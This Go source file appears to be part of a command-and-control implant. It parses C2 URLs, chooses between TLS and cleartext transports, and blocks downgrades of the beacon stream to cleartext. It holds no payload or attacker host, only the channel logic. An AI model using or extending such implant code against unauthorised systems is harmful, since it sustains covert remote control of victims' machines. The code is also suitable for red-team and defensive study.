//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"net"
	"net/url"
	"strings"
)

// c2DialHostPort extracts host:port from a C2 URL that may be a full URL
// (http://host:8443/path), a transport URL (tcp://host:4444), a bare
// host:port, or an IPv6 literal ([::1]:8443). Callers must never pass the
// raw URL to net.Dial — http://host:port has too many colons.
//
// If raw contains a comma-separated failover list, only the first segment
// is parsed; pass c2URLAtIndex(...) when a specific entry is wanted.
func c2DialHostPort(raw string) (hostPort string, scheme string, ok bool) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return "", "", false
	}
	if i := strings.IndexByte(raw, ','); i >= 0 {
		raw = strings.TrimSpace(raw[:i])
		if raw == "" {
			return "", "", false
		}
	}

	if !strings.Contains(raw, "://") {
		if _, _, err := net.SplitHostPort(raw); err == nil {
			return raw, "", true
		}
		if strings.ContainsAny(raw, "/\\ ") {
			return "", "", false
		}
		return raw, "", true
	}

	u, err := url.Parse(raw)
	if err != nil || u.Host == "" {
		return "", "", false
	}
	return u.Host, strings.ToLower(u.Scheme), true
}

// currentC2Raw is the C2 URL the active index (or C2URL) currently points at.
func currentC2Raw() string {
	if u := c2URLAtIndex(int(currentC2Idx.Load())); u != "" {
		return u
	}
	raw := strings.TrimSpace(C2URL)
	if i := strings.IndexByte(raw, ','); i >= 0 {
		return strings.TrimSpace(raw[:i])
	}
	return raw
}

func currentC2Dial() (hostPort string, scheme string, ok bool) {
	return c2DialHostPort(currentC2Raw())
}

func hostnameFromHostPort(hostPort string) string {
	host, _, err := net.SplitHostPort(hostPort)
	if err != nil {
		return hostPort
	}
	return host
}

func c2UseTLS(scheme string) bool {
	if SkipTLSVerify {
		return true
	}
	switch scheme {
	case "tls", "https", "wss", "grpcs", "mtls":
		return true
	}
	return false
}

// tlsOnlySchemes are the C2 URL schemes that always carry transport
// encryption. A scheme absent from this list is treated as cleartext for
// downgrade decisions.
var tlsOnlySchemes = map[string]bool{
	"https":    true,
	"wss":      true,
	"grpcs":    true,
	"mtls":     true,
	"tls":      true,
	"quic":     true,
	"ssh":      true,
	"grpc+tls": true,
}

// c2URLListSecureOnly reports whether every configured C2 URL uses an
// encrypted scheme. Such an implant must never silently fall back to a
// cleartext transport: a network attacker who can block TLS would otherwise
// downgrade the agent onto http:// / ws:// / h2c:// / tcp:// / udp:// / DNS and
// read (or rewrite) the beacon stream. Operators who want lab-style
// cleartext failover keep today's behaviour by configuring at least one
// cleartext URL.
func c2URLListSecureOnly() bool {
	urls := c2URLsSnapshot()
	if len(urls) == 0 {
		raw := strings.TrimSpace(C2URL)
		if raw == "" {
			return false
		}
		if i := strings.IndexByte(raw, ','); i >= 0 {
			raw = strings.TrimSpace(raw[:i])
		}
		urls = []string{raw}
	}
	secure := 0
	for _, raw := range urls {
		_, scheme, ok := c2DialHostPort(raw)
		if !ok || scheme == "" {
			// A bare host:port has no transport; the HTTP transport decides
			// (http by default), so it cannot make the list "secure only".
			return false
		}
		if tlsOnlySchemes[scheme] {
			secure++
		} else {
			return false
		}
	}
	return secure > 0
}

// c2SecureOnlyTransportAllowed reports whether the agent may switch to the
// named transport while in secure-only mode.
func c2SecureOnlyTransportAllowed(name string) bool {
	if !c2URLListSecureOnly() {
		return true
	}
	switch strings.ToLower(strings.TrimSpace(name)) {
	case "quic", "ssh", "grpc", "wss", "mtls":
		return true
	case "http":
		// Allowed only when an actual encrypted HTTP-family URL exists.
		for _, raw := range c2URLsSnapshot() {
			if _, scheme, ok := c2DialHostPort(raw); ok {
				switch scheme {
				case "https", "wss", "grpcs", "mtls":
					return true
				}
			}
		}
		return false
	default:
		// tcp/udp/dns/icmp/h2c have no encrypted form in the candidate list.
		return false
	}
}

func transportSchemes(name string) []string {
	switch strings.ToLower(strings.TrimSpace(name)) {
	case "tcp":
		return []string{"tcp", "tls"}
	case "http":
		return []string{"http", "https", "h2c", "ws", "wss"}
	case "dns":
		return []string{"dns"}
	case "icmp":
		return []string{"icmp"}
	case "udp":
		return []string{"udp"}
	case "quic":
		return []string{"quic"}
	default:
		s := strings.ToLower(strings.TrimSpace(name))
		if s == "" {
			return nil
		}
		return []string{s}
	}
}

func schemeMatchesTransport(scheme, transport string) bool {
	if scheme == "" {
		return false
	}
	for _, w := range transportSchemes(transport) {
		if scheme == w {
			return true
		}
	}
	return false
}

// indexOfTransportURL finds a configured C2 URL whose scheme matches the
// named transport. Used when rotating transports so TCP failover dials a
// tcp:// entry instead of the HTTP URL sitting at index 0.
func indexOfTransportURL(name string) (int, bool) {
	urls := c2URLsSnapshot()
	if len(urls) == 0 {
		_, scheme, ok := c2DialHostPort(C2URL)
		return 0, ok && schemeMatchesTransport(scheme, name)
	}
	for i, u := range urls {
		_, scheme, ok := c2DialHostPort(u)
		if ok && schemeMatchesTransport(scheme, name) {
			return i, true
		}
	}
	return 0, false
}

func urlListHasTransport(name string) bool {
	_, ok := indexOfTransportURL(name)
	return ok
}
